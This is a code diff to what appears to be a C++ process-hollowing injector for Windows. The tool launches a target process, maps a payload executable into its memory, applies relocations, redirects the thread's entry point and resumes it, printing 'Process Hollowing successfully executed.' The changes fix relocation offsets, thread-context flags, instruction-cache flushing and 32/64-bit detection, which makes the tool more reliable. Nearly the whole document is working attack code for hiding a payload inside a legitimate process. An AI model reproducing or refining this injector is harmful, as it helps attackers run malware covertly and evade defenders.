@@ -86,7 +86,9 @@ LPVOID GetFileContent(const LPSTR& lpSourceImage) {
 
     std::cout << "\n[+] Payload's size (on disk): " << dwFileSize;
 
-    const LPVOID hFileContent = HeapAlloc(GetProcessHeap(), 0, (SIZE_T)dwFileSize);  // Allocate heap for the payload
+    const LPVOID hFileContent =
+        HeapAlloc(GetProcessHeap(), 0,
+                  (SIZE_T)dwFileSize);  // Allocate heap for the payload
     if (hFileContent == NULL) {
         std::cout << "\nHeap allocation failed.";
         HeapFree(GetProcessHeap(), 0, hFileContent);
@@ -130,7 +132,7 @@ ProcessAddressInformation GetProcAddrInfo32(const LPPROCESS_INFORMATION lpPI) {
     std::cout << "\n=====GET TARGET PROCESS ADDRESS INFO (x86)=====\n";
     LPVOID lpProcessBaseAddress = nullptr;
     WOW64_CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.ContextFlags = WOW64_CONTEXT_FULL;
 
     if (!Wow64GetThreadContext(lpPI->hThread, &ctx)) {
         std::cout << "\nRead context failed.";
@@ -182,7 +184,7 @@ ProcessAddressInformation GetProcAddrInfo64(const LPPROCESS_INFORMATION lpPI) {
                                      lpProcessBaseAddress};
 }
 
-bool IsPayload32(const LPVOID lpFileContent) {
+char IsPayload32(const LPVOID lpFileContent) {
     std::cout << "\n=====CHECK PAYLOAD ARCH=====\n";
     const auto pImgDOSHeader = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto pImgNTHeaders =
@@ -190,11 +192,15 @@ bool IsPayload32(const LPVOID lpFileContent) {
 
     if (pImgNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
         std::cout << "\nResult: x86";
-        return true;
+        return '8';
+    } else if (pImgNTHeaders->OptionalHeader.Magic ==
+               IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        std::cout << "\nResult: x64";
+        return '6';
     }
 
-    std::cout << "\nResult: x64";
-    return false;
+    std::cout << "\nThe Magic value is not valid";
+    return 'x';
 }
 
 DWORD GetPayloadSubsystem32(const LPVOID lpFileContent) {
@@ -330,7 +336,7 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
     // Ebx: Address of PEB (virtual address, not RVA)
     // Ebx + 0x8: Address of the ImageBaseAddress
     WOW64_CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.ContextFlags = WOW64_CONTEXT_FULL;
 
     if (!Wow64GetThreadContext(lpPI->hThread, &ctx)) {
         std::cout << "\nRead context failed. Error code: " << GetLastError();
@@ -351,6 +357,14 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
 
     if (!Wow64SetThreadContext(lpPI->hThread, &ctx)) {
         std::cout << "\nUpdate context failed. Error code: " << GetLastError();
+        return false;
+    }
+
+    // Flush instruction cache of the CPU to ensure instruction-cache coherence
+    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
+                               lpNT->OptionalHeader.SizeOfImage)) {
+        std::cout << "\nFlush instruction cache failed. Error code: "
+                  << GetLastError();
         return false;
     }
 
@@ -438,6 +452,14 @@ bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
 
     if (!SetThreadContext(lpPI->hThread, &ctx)) {
         std::cout << "\nUpdate context failed. Error code: " << GetLastError();
+        return false;
+    }
+
+    // Flush instruction cache of the CPU to ensure instruction-cache coherence
+    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
+                               lpNT->OptionalHeader.SizeOfImage)) {
+        std::cout << "\nFlush instruction cache failed. Error code: "
+                  << GetLastError();
         return false;
     }
 
@@ -550,7 +572,8 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                                     (i * sizeof(IMAGE_SECTION_HEADER)));
 
         if (bNeedReloc &&
-            ImgDataReloc.VirtualAddress >= (uintptr_t)lpImageSectionHeader &&
+            ImgDataReloc.VirtualAddress >=
+                (uintptr_t)lpImageSectionHeader->VirtualAddress &&
             ImgDataReloc.VirtualAddress <
                 (lpImageSectionHeader->VirtualAddress +
                  lpImageSectionHeader->Misc.VirtualSize))
@@ -588,11 +611,12 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
             std::cout << "\n[+] Block " << ++iNumOfBlocks;
             const auto RelocBlock =
                 (PIMAGE_BASE_RELOCATION)(DWORD64)((uintptr_t)lpFileContent +
+                                                  dwRelocOffset +
                                                   lpRelocSection
                                                       ->PointerToRawData +
-                                                  dwRelocOffset);  // Get the
-                                                                   // reloc
-                                                                   // block
+                                                  (ImgDataReloc.VirtualAddress -
+                                                   lpRelocSection
+                                                       ->VirtualAddress));  // Get the reloc block
             dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION);
 
             DWORD dwNumOfEntries = (DWORD)(RelocBlock->SizeOfBlock - 0x8) /
@@ -639,7 +663,7 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
 
     // Set new entry point (Eax) and write the new image base (Ebx + 0x8)
     WOW64_CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.ContextFlags = WOW64_CONTEXT_FULL;
 
     if (!Wow64GetThreadContext(lpPI->hThread, &ctx)) {
         std::cout << "\nCannot retrieve context. Error code: "
@@ -659,6 +683,14 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
 
     if (!Wow64SetThreadContext(lpPI->hThread, &ctx)) {
         std::cout << "\nCannot set new thread context. Error code: "
+                  << GetLastError();
+        return false;
+    }
+
+    // Flush instruction cache of the CPU to ensure instruction-cache coherence
+    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
+                               lpNT->OptionalHeader.SizeOfImage)) {
+        std::cout << "\nFlush instruction cache failed. Error code: "
                   << GetLastError();
         return false;
     }
@@ -803,11 +835,12 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
             std::cout << "\n[+] Block " << ++iNumOfBlocks;
             const auto RelocBlock =
                 (PIMAGE_BASE_RELOCATION)(DWORD64)((uintptr_t)lpFileContent +
+                                                  dwRelocOffset +
                                                   lpRelocSection
                                                       ->PointerToRawData +
-                                                  dwRelocOffset);  // Get the
-                                                                   // reloc
-                                                                   // block
+                                                  (ImgDataReloc.VirtualAddress -
+                                                   lpRelocSection
+                                                       ->VirtualAddress));  // Get the reloc block
             std::cout << "\nGetting reloc block done.";
             dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION);
             std::cout << "\n[+] Reloc Offset: " << dwRelocOffset;
@@ -880,6 +913,14 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
         return false;
     }
 
+    // Flush instruction cache of the CPU to ensure instruction-cache coherence
+    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
+                               lpNT->OptionalHeader.SizeOfImage)) {
+        std::cout << "\nFlush instruction cache failed. Error code: "
+                  << GetLastError();
+        return false;
+    }
+
     ResumeThread(lpPI->hThread);
     return true;
 }
@@ -939,9 +980,30 @@ int main(const int argc, char* argv[]) {
         return -1;
     }
 
-    BOOL bTarget32;
-    IsWow64Process(PI.hProcess, &bTarget32);  // WOW64: x86 emulator on x64
-                                              // arch
+    USHORT ProcessMachine, TargetMachine;
+    if (!IsWow64Process2(PI.hProcess, &ProcessMachine,
+                         &TargetMachine))  // WOW64: x86 emulator on x64 arch
+    {
+        std::cout << "\nGetting target's arch failed.";
+        CloseProcessAndCleanPayload(&PI, lpFileContent);
+        return -1;
+    }
+
+    bool bTarget32;
+    if (ProcessMachine == IMAGE_FILE_MACHINE_I386)
+        bTarget32 = true;
+    else if (ProcessMachine == IMAGE_FILE_MACHINE_UNKNOWN) {
+        if (TargetMachine == IMAGE_FILE_MACHINE_AMD64 ||
+            TargetMachine == IMAGE_FILE_MACHINE_IA64) {
+            bTarget32 = false;
+        } else if (TargetMachine == IMAGE_FILE_MACHINE_I386) {
+            bTarget32 = true;
+        } else {
+            std::cout << "\nTarget's architecture is not supported.";
+            CloseProcessAndCleanPayload(&PI, lpFileContent);
+            return -1;
+        }
+    }
 
     // Get address info of the target
     ProcessAddressInformation PAI;
@@ -968,11 +1030,16 @@ int main(const int argc, char* argv[]) {
      */
 
     /*32 or 64*/
-    bool bPayload32 = IsPayload32(lpFileContent);
+    char cPayload32 = IsPayload32(lpFileContent);
+    if (cPayload32 == 'x') {
+        CloseProcessAndCleanPayload(&PI, lpFileContent);
+        return -1;
+    }
 
-    if (bPayload32 != bTarget32) {
+    if ((cPayload32 == '8' && !bTarget32) || (cPayload32 == '6' && bTarget32)) {
         std::cout << "\nArchitecture is not compatible.";
-        std::cout << "\n- Payload: " << (bPayload32 ? "32-bit" : "64-bit");
+        std::cout << "\n- Payload: "
+                  << ((cPayload32 == '8') ? "32-bit" : "64-bit");
         std::cout << "\n- Target: " << (bTarget32 ? "32-bit" : "64-bit");
         CloseProcessAndCleanPayload(&PI, lpFileContent);
         return -1;
@@ -981,7 +1048,7 @@ int main(const int argc, char* argv[]) {
     /*Subsystem*/
     std::cout << "\n=====SUBSYSTEM=====\n";
     DWORD dwPayloadSubsystem;
-    if (bPayload32)
+    if (cPayload32 == '8')
         dwPayloadSubsystem = GetPayloadSubsystem32(lpFileContent);
     else
         dwPayloadSubsystem = GetPayloadSubsystem64(lpFileContent);
@@ -1019,13 +1086,13 @@ int main(const int argc, char* argv[]) {
     /***********************************/
 
     bool bPayloadHasReloc;
-    if (bPayload32)
+    if (cPayload32 == '8')
         bPayloadHasReloc = HasReloc32(lpFileContent);
     else
         bPayloadHasReloc = HasReloc64(lpFileContent);
 
     // Executing
-    if (bPayload32 && !bPayloadHasReloc) {
+    if (cPayload32 == '8' && !bPayloadHasReloc) {
         std::cout << "\n=====PE32=====\n";
         if (RunPE32(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
@@ -1034,7 +1101,7 @@ int main(const int argc, char* argv[]) {
 
     }
 
-    else if (bPayload32 && bPayloadHasReloc) {
+    else if (cPayload32 == '8' && bPayloadHasReloc) {
         std::cout << "\n=====PEReloc32=====\n";
         if (RunPEReloc32(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
@@ -1042,14 +1109,14 @@ int main(const int argc, char* argv[]) {
         }
     }
 
-    if (!bPayload32 && !bPayloadHasReloc) {
+    if (cPayload32 == '6' && !bPayloadHasReloc) {
         std::cout << "\n=====PE64=====\n";
         if (RunPE64(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
             return 0;
         }
 
-    } else if (!bPayload32 && bPayloadHasReloc) {
+    } else if (cPayload32 == '6' && bPayloadHasReloc) {
         std::cout << "\n=====PEReloc64=====\n";
         if (RunPEReloc64(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
